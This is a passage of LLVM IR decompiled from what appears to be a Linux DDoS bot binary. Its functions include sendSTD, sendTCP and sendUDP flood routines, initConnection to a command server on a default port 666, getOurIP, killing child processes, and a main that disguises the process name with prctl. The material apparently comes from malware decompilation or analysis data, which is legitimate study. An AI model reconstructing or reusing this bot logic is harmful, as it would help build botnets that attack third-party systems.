  %v3_1000ac88 = icmp eq i32 %v0_1000ac80, 0
  br i1 %v3_1000ac88, label %dec_label_pc_1000ac90, label %dec_label_pc_1000aca8

dec_label_pc_1000ac90:                            ; preds = %dec_label_pc_1000ac80
  %v3_1000ac9c = call i32 @sendSTD(i32 %storemerge1224, i32 %v2_1000ac1c, i32 %v2_1000ac38)
  %v1_1000aca4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000aca8

dec_label_pc_1000aca8:                            ; preds = %dec_label_pc_1000ac80, %dec_label_pc_1000ac90
  store i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32* @r4, align 4
  store i32 268479672, i32* @lr, align 4
  %v3_1000acb4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), i32 268500992)
  %v3_1000acc4 = icmp eq i32 %v3_1000acb4, 0
  br i1 %v3_1000acc4, label %dec_label_pc_1000acf8, label %dec_label_pc_1000ac80

dec_label_pc_1000acd0:                            ; preds = %dec_label_pc_1000abfc
  store i32 268479700, i32* @lr, align 4
  %v0_1000acd0 = call i32 @listFork()
  %v3_1000acd8 = icmp eq i32 %v0_1000acd0, 0
  br i1 %v3_1000acd8, label %dec_label_pc_1000ace0, label %dec_label_pc_1000aea0

dec_label_pc_1000ace0:                            ; preds = %dec_label_pc_1000acd0
  %v3_1000acec = call i32 @sendSTD(i32 %v2_1000ac04, i32 %v2_1000ac1c, i32 %v2_1000ac38)
  %v1_1000acf4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000acf8

dec_label_pc_1000acf8:                            ; preds = %dec_label_pc_1000aca8, %dec_label_pc_1000ac60, %dec_label_pc_1000ab6c, %dec_label_pc_1000ace0
  %v2_1000acfc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1001645c.530 to i32), i32* @r4, align 4
  %v3_1000ad0c = inttoptr i32 %v2_1000acfc to i8*
  %v4_1000ad0c = call i32 @__GI_strcoll(i8* %v3_1000ad0c, i32 ptrtoint ([9 x i8]* @global_var_1001645c.530 to i32))
  %v3_1000ad14 = icmp eq i32 %v4_1000ad0c, 0
  br i1 %v3_1000ad14, label %dec_label_pc_1000ad1c, label %dec_label_pc_1000ae74

dec_label_pc_1000ad1c:                            ; preds = %dec_label_pc_1000acf8
  br label %dec_label_pc_1000adc0

dec_label_pc_1000ad30:                            ; preds = %dec_label_pc_1000adc0, %dec_label_pc_1000ae08
  %v1_1000ad34 = mul i32 %storemerge10, 4
  %v3_1000ad40 = load i32, i32* @global_var_100285e4.48, align 4
  %v2_1000ad44 = add i32 %v3_1000ad40, %v1_1000ad34
  %v1_1000ad48 = inttoptr i32 %v2_1000ad44 to i32*
  %v2_1000ad48 = load i32, i32* %v1_1000ad48, align 4
  %v3_1000ad4c = icmp eq i32 %v2_1000ad48, 0
  br i1 %v3_1000ad4c, label %dec_label_pc_1000adb4, label %dec_label_pc_1000ad54

dec_label_pc_1000ad54:                            ; preds = %dec_label_pc_1000ad30
  %v2_1000ad6c = load i32, i32* %v1_1000ad48, align 4
  store i32 268479860, i32* @lr, align 4
  %v0_1000ad70 = call i32 @__libc_getpid()
  %v4_1000ad78 = icmp eq i32 %v2_1000ad6c, %v0_1000ad70
  br i1 %v4_1000ad78, label %dec_label_pc_1000adb4, label %dec_label_pc_1000ad80

dec_label_pc_1000ad80:                            ; preds = %dec_label_pc_1000ad54
  %v3_1000ad90 = load i32, i32* @global_var_100285e4.48, align 4
  %v2_1000ad94 = add i32 %v3_1000ad90, %v1_1000ad34
  %v1_1000ad98 = inttoptr i32 %v2_1000ad94 to i32*
  %v2_1000ad98 = load i32, i32* %v1_1000ad98, align 4
  store i32 268479912, i32* @lr, align 4
  %v2_1000ada4 = call i32 @kill(i32 %v2_1000ad98, i32 9)
  %v1_1000adac = add i32 %stack_var_-196.1, 1
  br label %dec_label_pc_1000adb4

dec_label_pc_1000adb4:                            ; preds = %dec_label_pc_1000ad54, %dec_label_pc_1000ad30, %dec_label_pc_1000ad80
  %stack_var_-196.0 = phi i32 [ %stack_var_-196.1, %dec_label_pc_1000ad30 ], [ %stack_var_-196.1, %dec_label_pc_1000ad54 ], [ %v1_1000adac, %dec_label_pc_1000ad80 ]
  %v1_1000adb8 = add i32 %storemerge10, 1
  br label %dec_label_pc_1000adc0

dec_label_pc_1000adc0:                            ; preds = %dec_label_pc_1000ad1c, %dec_label_pc_1000adb4
  %stack_var_-196.1 = phi i32 [ 0, %dec_label_pc_1000ad1c ], [ %stack_var_-196.0, %dec_label_pc_1000adb4 ]
  %storemerge10 = phi i32 [ 0, %dec_label_pc_1000ad1c ], [ %v1_1000adb8, %dec_label_pc_1000adb4 ]
  %v2_1000ade8 = load i32, i32* @global_var_100285b8.46, align 4
  %v3_1000ae00 = icmp eq i32 %v2_1000ade8, 0
  br i1 %v3_1000ae00, label %dec_label_pc_1000ae08, label %dec_label_pc_1000ad30

dec_label_pc_1000ae08:                            ; preds = %dec_label_pc_1000adc0
  %v3_1000adec = load i32, i32* @global_var_100285bc.47, align 4
  %v3_1000ae20 = icmp ugt i32 %v3_1000adec, %storemerge10
  br i1 %v3_1000ae20, label %dec_label_pc_1000ad30, label %dec_label_pc_1000ae28

dec_label_pc_1000ae28:                            ; preds = %dec_label_pc_1000ae08
  %tmp94 = icmp slt i32 %stack_var_-196.1, 1
  %v3_1000ae5c = load i32, i32* @global_var_100285b0.29, align 4
  br i1 %tmp94, label %dec_label_pc_1000ae58, label %dec_label_pc_1000ae34

dec_label_pc_1000ae34:                            ; preds = %dec_label_pc_1000ae28
  store i32 ptrtoint (i32* @global_var_1000ae54.532 to i32), i32* @lr, align 4
  %v5_1000ae50 = call i32 @sockprintf(i32 %v3_1000ae5c, i32 ptrtoint ([11 x i8]* @global_var_10016468.531 to i32), i32 %stack_var_-196.1)
  br label %dec_label_pc_1000ae74

dec_label_pc_1000ae58:                            ; preds = %dec_label_pc_1000ae28
  store i32 268480116, i32* @lr, align 4
  %v4_1000ae70 = call i32 @sockprintf(i32 %v3_1000ae5c, i32 ptrtoint ([13 x i8]* @global_var_10016474.533 to i32), i32 268500992)
  br label %dec_label_pc_1000ae74

dec_label_pc_1000ae74:                            ; preds = %dec_label_pc_1000acf8, %dec_label_pc_1000ae34, %dec_label_pc_1000ae58
  %v2_1000ae78 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_10016484.534 to i32), i32* @r4, align 4
  %v3_1000ae88 = inttoptr i32 %v2_1000ae78 to i8*
  %v4_1000ae88 = call i32 @__GI_strcoll(i8* %v3_1000ae88, i32 ptrtoint ([10 x i8]* @global_var_10016484.534 to i32))
  %v3_1000ae90 = icmp eq i32 %v4_1000ae88, 0
  br i1 %v3_1000ae90, label %dec_label_pc_1000ae98, label %dec_label_pc_1000aea0

dec_label_pc_1000ae98:                            ; preds = %dec_label_pc_1000ae74
  %v0_1000ae9c = call i32 @__GI_exit()
  br label %dec_label_pc_1000aea0

dec_label_pc_1000aea0:                            ; preds = %dec_label_pc_1000a618, %dec_label_pc_1000a5bc, %dec_label_pc_1000aabc, %dec_label_pc_1000acd0, %dec_label_pc_1000ae74, %dec_label_pc_1000a640, %dec_label_pc_1000a16c, %dec_label_pc_1000a98c, %dec_label_pc_1000a0f8, %dec_label_pc_1000abdc, %dec_label_pc_1000a790, %dec_label_pc_1000a44c, %dec_label_pc_1000a2b4, %dec_label_pc_1000a1a4, %dec_label_pc_1000a080, %dec_label_pc_1000a03c, %dec_label_pc_1000ae98
  %v0_1000aec8 = phi i32 [ %v0_1000aabc, %dec_label_pc_1000aabc ], [ %v0_1000acd0, %dec_label_pc_1000acd0 ], [ %v4_1000ae88, %dec_label_pc_1000ae74 ], [ %v0_1000a640, %dec_label_pc_1000a640 ], [ 0, %dec_label_pc_1000a16c ], [ 0, %dec_label_pc_1000a98c ], [ 0, %dec_label_pc_1000a0f8 ], [ %v4_1000abf4, %dec_label_pc_1000abdc ], [ %v4_1000a7a8, %dec_label_pc_1000a790 ], [ %v4_1000a464, %dec_label_pc_1000a44c ], [ %v5_1000a2ec, %dec_label_pc_1000a2b4 ], [ %v0_1000a17c, %dec_label_pc_1000a1a4 ], [ %v5_1000a0a4, %dec_label_pc_1000a080 ], [ %v4_1000a054, %dec_label_pc_1000a03c ], [ %v0_1000ae9c, %dec_label_pc_1000ae98 ], [ 0, %dec_label_pc_1000a5bc ], [ 0, %dec_label_pc_1000a618 ]
  ret i32 %v0_1000aec8

; uselistorder directives
  uselistorder i32 %v3_1000ae5c, { 1, 0 }
  uselistorder i32 %storemerge10, { 1, 0, 2 }
  uselistorder i32 %stack_var_-196.1, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_1000ad34, { 1, 0 }
  uselistorder i32 %v3_1000acb4, { 1, 0 }
  uselistorder i32 %v2_1000ac38, { 1, 0 }
  uselistorder i32 %v2_1000ac1c, { 1, 0 }
  uselistorder i32 %v2_1000ac04, { 1, 0, 3, 2 }
  uselistorder i32* %v1_1000a9a0, { 2, 0, 1, 3 }
  uselistorder i32 %v3_1000a914, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %v2_1000a81c, { 1, 0 }
  uselistorder i32 %v2_1000a808, { 1, 0 }
  uselistorder i32 %v2_1000a7ec, { 1, 0 }
  uselistorder i32 %v2_1000a7d0, { 1, 0 }
  uselistorder i32 %v2_1000a7b8, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1000a624, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %storemerge919, { 1, 0 }
  uselistorder i32 %v2_1000a508, { 1, 0 }
  uselistorder i32 %v2_1000a4e0, { 1, 0 }
  uselistorder i32 %v2_1000a4c4, { 1, 0 }
  uselistorder i32 %v2_1000a4a8, { 1, 0 }
  uselistorder i32 %v2_1000a48c, { 1, 0 }
  uselistorder i32 %v2_1000a474, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-80, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %tmp, { 8, 9, 10, 11, 12, 13, 5, 6, 7, 14, 4, 15, 16, 17, 18, 3, 19, 20, 21, 2, 1, 0, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10015f6c.365 to i32), { 2, 10, 3, 11, 1, 12, 4, 13, 0, 14, 5, 15, 6, 16, 7, 17, 8, 18, 9, 19 }
  uselistorder i32 (i32)* @getdtablesize, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_100150d4.30 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000aea0, { 16, 4, 3, 9, 2, 7, 10, 5, 0, 1, 11, 12, 13, 6, 8, 14, 15 }
  uselistorder label %dec_label_pc_1000ae74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000adc0, { 1, 0 }
  uselistorder label %dec_label_pc_1000adb4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ad30, { 1, 0 }
  uselistorder label %dec_label_pc_1000acf8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000aca8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac80, { 1, 0 }
  uselistorder label %dec_label_pc_1000ab6c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000aa94, { 1, 0 }
  uselistorder label %dec_label_pc_1000a9e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a968, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000a908, { 1, 0 }
  uselistorder label %dec_label_pc_1000a8d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a88c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a854, { 1, 0 }
  uselistorder label %dec_label_pc_1000a7b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a67c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a618, { 1, 0 }
  uselistorder label %dec_label_pc_1000a5dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000a598, { 1, 0 }
  uselistorder label %dec_label_pc_1000a560, { 1, 0 }
  uselistorder label %dec_label_pc_1000a54c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a46c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a290, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a214, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a144, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4132 = alloca i32, align 4
  %v2_1000aee0 = ptrtoint i32* %stack_var_-4132 to i32
  store i32 268480248, i32* @lr, align 4
  %v3_1000aef4 = call i32 @__GI_memset(i32 %v2_1000aee0, i32 0, i32 4096)
  %v3_1000aefc = load i32, i32* @global_var_100285b0.29, align 4
  %v3_1000af00 = icmp eq i32 %v3_1000aefc, 0
  br i1 %v3_1000af00, label %dec_label_pc_1000af24, label %dec_label_pc_1000af08

dec_label_pc_1000af08:                            ; preds = %entry
  store i32 268480280, i32* @lr, align 4
  %v1_1000af14 = call i32 @__libc_close(i32 %v3_1000aefc)
  store i32 0, i32* @global_var_100285b0.29, align 4
  br label %dec_label_pc_1000af24

dec_label_pc_1000af24:                            ; preds = %entry, %dec_label_pc_1000af08
  %v3_1000af28 = load i32, i32* @global_var_1002856c.535, align 4
  %v3_1000af2c = icmp eq i32 %v3_1000af28, 0
  br i1 %v3_1000af2c, label %dec_label_pc_1000af34, label %dec_label_pc_1000af44

dec_label_pc_1000af34:                            ; preds = %dec_label_pc_1000af24
  br label %dec_label_pc_1000af58

dec_label_pc_1000af44:                            ; preds = %dec_label_pc_1000af24
  %v1_1000af4c = add i32 %v3_1000af28, 1
  br label %dec_label_pc_1000af58

dec_label_pc_1000af58:                            ; preds = %dec_label_pc_1000af34, %dec_label_pc_1000af44
  %storemerge = phi i32 [ 0, %dec_label_pc_1000af34 ], [ %v1_1000af4c, %dec_label_pc_1000af44 ]
  store i32 %storemerge, i32* @global_var_1002856c.535, align 4
  %v1_1000af6c = mul i32 %storemerge, 4
  %v2_1000af70 = add i32 %v1_1000af6c, ptrtoint ([19 x i8]** @global_var_10028568.537 to i32)
  %v1_1000af74 = inttoptr i32 %v2_1000af70 to i32*
  %v2_1000af74 = load i32, i32* %v1_1000af74, align 4
  %v2_1000af80 = inttoptr i32 %v2_1000af74 to i8*
  %v3_1000af80 = call i32 @strcpy(i32 %v2_1000aee0, i8* %v2_1000af80)
  store i32 %v2_1000aee0, i32* @r3, align 4
  store i32 268480412, i32* @lr, align 4
  %v2_1000af98 = call i32 @__GI_strchr(i32 %v2_1000aee0, i32 58)
  %v3_1000afa0 = icmp eq i32 %v2_1000af98, 0
  br i1 %v3_1000afa0, label %dec_label_pc_1000aff0, label %dec_label_pc_1000afa8

dec_label_pc_1000afa8:                            ; preds = %dec_label_pc_1000af58
  store i32 %v2_1000aee0, i32* @r3, align 4
  store i32 268480440, i32* @lr, align 4
  %v2_1000afb4 = call i32 @__GI_strchr(i32 %v2_1000aee0, i32 58)
  %v1_1000afbc = add i32 %v2_1000afb4, 1
  store i32 268480456, i32* @lr, align 4
  %v2_1000afc4 = call i32 @atol(i32 %v1_1000afbc, i32 %v2_1000afb4)
  store i32 %v2_1000aee0, i32* @r3, align 4
  store i32 268480480, i32* @lr, align 4
  %v2_1000afdc = call i32 @__GI_strchr(i32 %v2_1000aee0, i32 58)
  %v3_1000afec = inttoptr i32 %v2_1000afdc to i8*
  store i8 0, i8* %v3_1000afec, align 1
  br label %dec_label_pc_1000aff0

dec_label_pc_1000aff0:                            ; preds = %dec_label_pc_1000af58, %dec_label_pc_1000afa8
  %stack_var_-4136.0 = phi i32 [ 666, %dec_label_pc_1000af58 ], [ %v2_1000afc4, %dec_label_pc_1000afa8 ]
  store i32 268480512, i32* @lr, align 4
  %v3_1000affc = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_1000affc, i32* @global_var_100285b0.29, align 4
  store i32 268480556, i32* @lr, align 4
  %v5_1000b028 = call i32 @connectTimeout(i32 %v3_1000affc, i32 %v2_1000aee0, i32 %stack_var_-4136.0, i32 30, i32 %v2_1000aee0)
  %v3_1000b030 = icmp eq i32 %v5_1000b028, 0
  %. = zext i1 %v3_1000b030 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_1000aee0, { 1, 0, 3, 2, 5, 4, 7, 6, 8, 9 }
  uselistorder i32 (i32, i32)* @atol, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000aff0, { 1, 0 }
  uselistorder label %dec_label_pc_1000af58, { 1, 0 }
  uselistorder label %dec_label_pc_1000af24, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4160 = alloca i8, align 1
  %stack_var_-4164 = alloca i32, align 4
  %stack_var_-4180 = alloca i32, align 4
  %stack_var_-4196 = alloca i32, align 4
  store i32 268480656, i32* @lr, align 4
  %v3_1000b08c = call i32 @socket(i32 2, i32 2, i32 0)
  %v4_1000b0a0 = icmp eq i32 %v3_1000b08c, -1
  br i1 %v4_1000b0a0, label %dec_label_pc_1000b0a8, label %dec_label_pc_1000b0b4

dec_label_pc_1000b0a8:                            ; preds = %entry
  br label %dec_label_pc_1000b2e0

dec_label_pc_1000b0b4:                            ; preds = %entry
  %v2_1000b0b4 = ptrtoint i32* %stack_var_-4196 to i32
  store i32 2, i32* %stack_var_-4196, align 4
  store i32 268480748, i32* @lr, align 4
  %v2_1000b0e8 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_10016490.539 to i32))
  store i32 53, i32* @r3, align 4
  %v1_1000b0f8 = call i32 @htons(i32 53)
  store i32 268480792, i32* @lr, align 4
  %v3_1000b114 = call i32 @__libc_connect(i32 %v3_1000b08c, i32 %v2_1000b0b4, i32 16)
  %v4_1000b128 = icmp eq i32 %v3_1000b114, -1
  br i1 %v4_1000b128, label %dec_label_pc_1000b130, label %dec_label_pc_1000b13c

dec_label_pc_1000b130:                            ; preds = %dec_label_pc_1000b0b4
  br label %dec_label_pc_1000b2e0

dec_label_pc_1000b13c:                            ; preds = %dec_label_pc_1000b0b4
  store i32 16, i32* %stack_var_-4164, align 4
  %v2_1000b144 = ptrtoint i32* %stack_var_-4180 to i32
  %v2_1000b148 = ptrtoint i32* %stack_var_-4164 to i32
  store i32 268480860, i32* @lr, align 4
  %v4_1000b158 = call i32 @__GI_getsockname(i32 %v3_1000b08c, i32 %v2_1000b144, i32 %v2_1000b148, i32 %v2_1000b148)
  %v4_1000b16c = icmp eq i32 %v4_1000b158, -1
  br i1 %v4_1000b16c, label %dec_label_pc_1000b174, label %dec_label_pc_1000b180

dec_label_pc_1000b174:                            ; preds = %dec_label_pc_1000b13c
  br label %dec_label_pc_1000b2e0

dec_label_pc_1000b180:                            ; preds = %dec_label_pc_1000b13c
  store i32 268480928, i32* @lr, align 4
  %v3_1000b19c = call i32 @__libc_open(i32 ptrtoint ([16 x i8]* @global_var_10016498.540 to i32), i32 0)
  %v2_1000b220 = ptrtoint i8* %stack_var_-4160 to i32
  br label %dec_label_pc_1000b220

dec_label_pc_1000b1ac:                            ; preds = %dec_label_pc_1000b220
  store i32 268480960, i32* @lr, align 4
  %v5_1000b1bc = call i32 @strstr(i32 %v2_1000b220, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100164a8.541, i32 0, i32 0), i32 268500992)
  %v3_1000b1c4 = icmp eq i32 %v5_1000b1bc, 0
  br i1 %v3_1000b1c4, label %dec_label_pc_1000b208, label %dec_label_pc_1000b1e4.preheader

dec_label_pc_1000b1e4.preheader:                  ; preds = %dec_label_pc_1000b1ac
  %v2_1000b1e810 = load i8, i8* %stack_var_-4160, align 1
  %v3_1000b1f014 = icmp eq i8 %v2_1000b1e810, 9
  br i1 %v3_1000b1f014, label %dec_label_pc_1000b1f8, label %dec_label_pc_1000b1d8

dec_label_pc_1000b1d8:                            ; preds = %dec_label_pc_1000b1e4.preheader, %dec_label_pc_1000b1d8
  %v4_1000b1e415 = phi i32 [ %v1_1000b1dc, %dec_label_pc_1000b1d8 ], [ %v2_1000b220, %dec_label_pc_1000b1e4.preheader ]
  %v1_1000b1dc = add i32 %v4_1000b1e415, 1
  %v5_1000b1e0 = inttoptr i32 %v1_1000b1dc to i8*
  %v2_1000b1e8 = load i8, i8* %v5_1000b1e0, align 1
  %v3_1000b1f0 = icmp eq i8 %v2_1000b1e8, 9
  br i1 %v3_1000b1f0, label %dec_label_pc_1000b1f8, label %dec_label_pc_1000b1d8

dec_label_pc_1000b1f8:                            ; preds = %dec_label_pc_1000b1d8, %dec_label_pc_1000b1e4.preheader
  %storemerge4.lcssa = phi i8* [ %stack_var_-4160, %dec_label_pc_1000b1e4.preheader ], [ %v5_1000b1e0, %dec_label_pc_1000b1d8 ]
  store i8 0, i8* %storemerge4.lcssa, align 1
  br label %dec_label_pc_1000b240

dec_label_pc_1000b208:                            ; preds = %dec_label_pc_1000b1ac
  store i32 268481056, i32* @lr, align 4
  %v3_1000b21c = call i32 @__GI_memset(i32 %v2_1000b220, i32 0, i32 4096)
  br label %dec_label_pc_1000b220

dec_label_pc_1000b220:                            ; preds = %dec_label_pc_1000b180, %dec_label_pc_1000b208
  %v3_1000b230 = call i32 @fdgets(i32 %v2_1000b220, i32 4096, i32 %v3_1000b19c)
  %v3_1000b238 = icmp eq i32 %v3_1000b230, 0
  br i1 %v3_1000b238, label %dec_label_pc_1000b240, label %dec_label_pc_1000b1ac

dec_label_pc_1000b240:                            ; preds = %dec_label_pc_1000b220, %dec_label_pc_1000b1f8
  store i32 268481096, i32* @lr, align 4
  %v1_1000b244 = call i32 @__libc_close(i32 %v3_1000b19c)
  %v3_1000b248 = load i8, i8* %stack_var_-4160, align 1
  %v3_1000b250 = icmp eq i8 %v3_1000b248, 0
  br i1 %v3_1000b250, label %dec_label_pc_1000b2d4, label %dec_label_pc_1000b258

dec_label_pc_1000b258:                            ; preds = %dec_label_pc_1000b240
  %v2_1000b258 = ptrtoint i32* %stack_var_-64 to i32
  %v3_1000b268 = call i32 @strcpy(i32 %v2_1000b258, i8* nonnull %stack_var_-4160)
  store i32 ptrtoint (i32* @global_var_1000b288.542 to i32), i32* @lr, align 4
  %v3_1000b284 = call i32 @ioctl(i32 %v3_1000b08c, i32 35111, i32 %v2_1000b258)
  %v2_1000b29c = ptrtoint i32* %stack_var_-46 to i32
  br label %dec_label_pc_1000b294

dec_label_pc_1000b294:                            ; preds = %dec_label_pc_1000b258, %dec_label_pc_1000b294
  %storemerge58 = phi i32 [ 0, %dec_label_pc_1000b258 ], [ %v1_1000b2c0, %dec_label_pc_1000b294 ]
  %v2_1000b2a4 = add i32 %storemerge58, %v2_1000b29c
  %v1_1000b2a8 = inttoptr i32 %v2_1000b2a4 to i8*
  %v2_1000b2a8 = load i8, i8* %v1_1000b2a8, align 1
  %v4_1000b2b8 = add i32 %storemerge58, ptrtoint (i32* @global_var_100285c0.543 to i32)
  %v5_1000b2b8 = inttoptr i32 %v4_1000b2b8 to i8*
  store i8 %v2_1000b2a8, i8* %v5_1000b2b8, align 1
  %v1_1000b2c0 = add nuw nsw i32 %storemerge58, 1
  %tmp37 = icmp slt i32 %v1_1000b2c0, 6
  br i1 %tmp37, label %dec_label_pc_1000b294, label %dec_label_pc_1000b2d4

dec_label_pc_1000b2d4:                            ; preds = %dec_label_pc_1000b294, %dec_label_pc_1000b240
  store i32 ptrtoint (i32* @global_var_1000b2dc.544 to i32), i32* @lr, align 4
  %v1_1000b2d8 = call i32 @__libc_close(i32 %v3_1000b08c)
  br label %dec_label_pc_1000b2e8

dec_label_pc_1000b2e0:                            ; preds = %dec_label_pc_1000b174, %dec_label_pc_1000b130, %dec_label_pc_1000b0a8
  br label %dec_label_pc_1000b2e8

dec_label_pc_1000b2e8:                            ; preds = %dec_label_pc_1000b2d4, %dec_label_pc_1000b2e0
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_1000b2e0 ], [ %tmp, %dec_label_pc_1000b2d4 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %storemerge58, { 2, 1, 0 }
  uselistorder i32 %v1_1000b1dc, { 1, 0 }
  uselistorder i32 %v2_1000b220, { 3, 1, 0, 2 }
  uselistorder i32 %v3_1000b08c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4164, { 1, 0 }
  uselistorder i8* %stack_var_-4160, { 2, 4, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @htons, { 10, 9, 8, 7, 6, 5, 4, 11, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b2e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000b294, { 1, 0 }
  uselistorder label %dec_label_pc_1000b220, { 1, 0 }
  uselistorder label %dec_label_pc_1000b1d8, { 1, 0 }
}

define i32 @getBuild(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint ([6 x i8]* @global_var_100164b4.545 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-4192 = alloca i32, align 4
  %stack_var_-5816 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-5732 = alloca i32, align 4
  %stack_var_-5216 = alloca i32, align 4
  %stack_var_-5472 = alloca i32, align 4
  %stack_var_-5728 = alloca i32, align 4
  %v1_1000b360 = bitcast i8** %argv to i32*
  %v2_1000b360 = load i32, i32* %v1_1000b360, align 4
  store i32 %v2_1000b360, i32* @r3, align 4
  %v0_1000b374 = call i32 @__GI_strlen()
  store i32 ptrtoint (i32* @global_var_100164bc.546 to i32), i32* @r4, align 4
  store i32 268481424, i32* @lr, align 4
  %v3_1000b38c = call i32 @strncpy(i32 %v2_1000b360, i32 ptrtoint (i32* @global_var_100164bc.546 to i32), i32 %v0_1000b374)
  store i32 ptrtoint (i32* @global_var_100164bc.546 to i32), i32* %v1_1000b360, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000b3c0.547 to i32), i32* @lr, align 4
  %v7_1000b3bc = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_100164bc.546 to i32), i32 0, i32 0, i32 0, i32 %tmp)
  store i32 268481480, i32* @lr, align 4
  %v1_1000b3c4 = call i32 @__GI_time(i32 0)
  store i32 268481488, i32* @lr, align 4
  %v0_1000b3cc = call i32 @__libc_getpid()
  %v2_1000b3d4 = xor i32 %v1_1000b3c4, %v0_1000b3cc
  store i32 ptrtoint ([3 x i8]* @global_var_1000b3e0.548 to i32), i32* @lr, align 4
  %v1_1000b3dc = call i32 @srand(i32 %v2_1000b3d4)
  store i32 268481512, i32* @lr, align 4
  %v1_1000b3e4 = call i32 @__GI_time(i32 0)
  store i32 268481520, i32* @lr, align 4
  %v0_1000b3ec = call i32 @__libc_getpid()
  %v2_1000b3f4 = xor i32 %v1_1000b3e4, %v0_1000b3ec
  %v1_1000b3fc = call i32 @init_rand(i32 %v2_1000b3f4)
  store i32 268481572, i32* @lr, align 4
  %v3_1000b420 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_100164c0.550 to i32), i32 ptrtoint ([2 x i8]* @global_var_100164d4.551 to i32))
  %v3_1000b430 = icmp eq i32 %v3_1000b420, 0
  br i1 %v3_1000b430, label %dec_label_pc_1000b438, label %dec_label_pc_1000b45c

dec_label_pc_1000b438:                            ; preds = %entry
  store i32 268481620, i32* @lr, align 4
  %v3_1000b450 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_100164d8.552 to i32), i32 ptrtoint ([2 x i8]* @global_var_100164d4.551 to i32))
  br label %dec_label_pc_1000b45c

dec_label_pc_1000b45c:                            ; preds = %entry, %dec_label_pc_1000b438
  %stack_var_-5756.0 = phi i32 [ %v3_1000b450, %dec_label_pc_1000b438 ], [ %v3_1000b420, %entry ]
  %stack_var_-5752.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100164d8.552, i32 0, i32 0), %dec_label_pc_1000b438 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_100164c0.550, i32 0, i32 0), %entry ]
  %v3_1000b460 = icmp eq i32 %stack_var_-5756.0, 0
  br i1 %v3_1000b460, label %dec_label_pc_1000b5dc, label %dec_label_pc_1000b468

dec_label_pc_1000b468:                            ; preds = %dec_label_pc_1000b45c
  %v2_1000b46c = load i32, i32* %v1_1000b360, align 4
  store i32 %v2_1000b46c, i32* @r3, align 4
  %v0_1000b474 = call i32 @__GI_strlen()
  %v2_1000b488 = ptrtoint i32* %stack_var_-5728 to i32
  store i32 268481688, i32* @lr, align 4
  %v2_1000b494 = call i32 @getcwd(i32 %v2_1000b488, i32 256)
  store i32 ptrtoint (i32* @global_var_100164e8.553 to i32), i32* @r4, align 4
  %v2_1000b4a8 = bitcast i32* %stack_var_-5728 to i8*
